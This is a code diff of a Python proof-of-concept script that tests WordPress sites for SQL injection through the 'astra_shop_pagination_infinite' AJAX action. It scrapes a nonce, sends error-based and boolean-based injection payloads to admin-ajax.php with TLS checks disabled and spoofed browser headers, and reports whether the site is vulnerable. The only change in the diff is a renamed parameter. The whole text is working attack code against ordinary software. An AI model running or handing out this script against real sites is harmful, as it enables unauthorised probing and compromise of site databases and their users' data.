@@ -11,7 +11,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.Session()
 
-def retrieve_nonce(target_url):
+def retrieve_nonce(profile_url):
     headers = {
         "Sec-Ch-Ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\"",
         "Sec-Ch-Ua-Mobile": "?0",
@@ -26,7 +26,7 @@ def retrieve_nonce(target_url):
         "Accept-Language": "en-US,en;q=0.9",
         "Connection": "close"
     }
-    response = session.get(target_url, headers=headers, allow_redirects=True, verify=False)
+    response = session.get(profile_url, headers=headers, allow_redirects=True, verify=False)
     if 'infinite_nonce' in response.text:
         nonce = re.compile('infinite_nonce":"(.+?)",').findall(str(response.text))[0]
         return nonce, response.url
@@ -34,7 +34,7 @@ def retrieve_nonce(target_url):
         print("Error: Unable to find Nonce.")
         exit()
 
-def submit_request(target_url, nonce, payload):
+def submit_request(profile_url, nonce, payload):
     data = {
         "action": "astra_shop_pagination_infinite",
         "page_no": "1",
@@ -58,17 +58,17 @@ def submit_request(target_url, nonce, payload):
         "Connection": "close",
         "Content-Type": "application/x-www-form-urlencoded"
     }
-    target_url += '/wp-admin/admin-ajax.php'
-    response = session.post(target_url, headers=headers, data=data, verify=False)
+    profile_url += '/wp-admin/admin-ajax.php'
+    response = session.post(profile_url, headers=headers, data=data, verify=False)
     return response.text
 
-def assess_sqli_vulnerability(target_url, nonce):
-    response = submit_request(target_url, nonce, "'")
+def assess_sqli_vulnerability(profile_url, nonce):
+    response = submit_request(profile_url, nonce, "'")
     if 'database error' in response:
         return True, 'Vulnerable to Error-Based SQL Injection.'
     
-    response1 = submit_request(target_url, nonce, '9656)) and ((7556=1223')
-    response2 = submit_request(target_url, nonce, '9634)) or ((6532=6532')
+    response1 = submit_request(profile_url, nonce, '9656)) and ((7556=1223')
+    response2 = submit_request(profile_url, nonce, '9634)) or ((6532=6532')
     if response1 == '' and (len(response2) > len(response1)):
         return True, 'Vulnerable to Boolean-Based SQL Injection.'
     
